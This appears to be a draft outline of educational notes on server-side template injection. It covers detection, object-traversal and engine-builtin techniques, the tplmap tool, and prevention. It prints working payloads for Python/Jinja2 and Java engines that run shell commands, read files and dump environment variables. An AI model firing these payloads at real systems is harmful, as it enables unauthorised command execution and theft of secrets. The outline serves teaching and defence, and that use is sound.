# layout
## brief introduction
- what are templates and templating engines?
    - reduces repeating pages (such as blog posts) with easy templates
        - things like formatting titles, authors, etc.
    - allows for easy communication between backend and frontend
    - used in many web frameworks, templating engines
        - Flask, Python, Jinja
        - Express/Vue.js, JavaScript, Angular.js?
        - Laravel, PHP, Blade
        - .NET?

## brief summary in attacking template engines
- introduced by James Kettle in 2015, tons of research since then
- methodology 
- detect -> identify -> exploit 
    - read, explore, attack

### ssti, server-side, detection
- testing for {{7*7}}
    - returns 49, code is actually run
- common XSS vulnerabilities can lead to template injections

```python
# example backend here
```

### client-side template injections
- more minor category but still possible
- [ ] find example https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti
- usually would execute XSS and steal sessions

## techniques
### using language builtins, object traversal
- because code is interpreted in the language, attackers can traverse object inheritance trees to access import modules
- example uses Python string to obtain `subprocess` to run shell
```python
''.__class__.__mro__[1].__subclasses__()[340]('whoami', shell=True, stdout=-1).communicate()[0].strip()
```
<!-- More examples -->
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
```

- Java builtin T object to run `.getenv()`
```java
T(java.lang.System).getenv()
```

### using engine builtins, comes with engine
- similar but easier ways, depends on the template engine
- shorter payloads

```java
$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
```
Jinja2 builtin that generates lorem ipsum text for websites:
```python
{{lipsum.__globals__.os.popen('cat flag.log').read()}}
```
- https://jinja.palletsprojects.com/en/3.1.x/templates/?highlight=lipsum#jinja-globals.lipsum

### tools
#### tplmap.py
- https://github.com/epinna/tplmap
- what does the tool do? fuzzes inputs against lists


## prevention
### sanitization
- filtering out userinput

### sandboxing
- templates would put engines in a "sandbox"
    - research into ways to break out of it

## keeping software up-to-date
